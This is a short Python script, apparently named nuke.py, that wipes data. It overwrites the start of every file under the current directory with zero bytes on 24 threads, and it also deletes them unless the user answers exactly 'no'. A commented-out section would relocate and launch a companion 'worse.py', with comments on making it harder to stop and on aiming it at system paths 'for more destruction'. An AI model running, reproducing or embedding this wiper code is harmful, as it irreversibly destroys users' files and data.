import os
# import subprocess
# import shutil
from concurrent.futures import ThreadPoolExecutor
input(f'Currently in {os.getcwd()}. Press ctrl + c to not destroy everything here') # remove this line to get rid of the warning
answer = input("Delete files? (say no)").strip().lower()
if answer == "no":
    delete = False
else:
    delete = True
flist = []
# try:
#     if os.name == 'posix':
#         source = os.path.expanduser("~/bad/worse.py")
#         destination = "/home/worse.py" #change to /worse.py for more destruction 
   

#     elif os.name == 'nt':
#         source = os.path.expanduser(r"~\bad\worse.py")
#         destination = r"C:\Users" #change to C:\worse.py for more destruction (idk if it works but who cares)

#     shutil.move(source, destination)
#     subprocess.run(
#         ["python3", "worse.py"], #change the linux one to include nohup at the start, and also add an exception handler that catches KeyboardInterupt to make sure the script stays running
#         cwd=destination
#     )
# except PermissionError:
#     print("Run the script with admin or root")
#     exit


for f in os.listdir():
    if f == "stresser.py" or f == "nuke.py":
        continue
    if os.path.isfile(f):
        flist.append(f)
    else:
        for root, dirs, files in os.walk(f):
            for file in files:
                flist.append(os.path.join(root, file))
def nuke(i):
    try:
        size = min(os.path.getsize(i), 500)
        with open(i, 'wb') as g:
            g.write(b'\x00' * size)
            print(f"Nuked file: {i}")
        if delete:
            os.remove(i)
            print(f'Deleted File: {i}')
    except Exception as e:
        print(f"Error: {e}")


with ThreadPoolExecutor(max_workers=24) as executor:
    executor.map(nuke, flist)
print('Done')
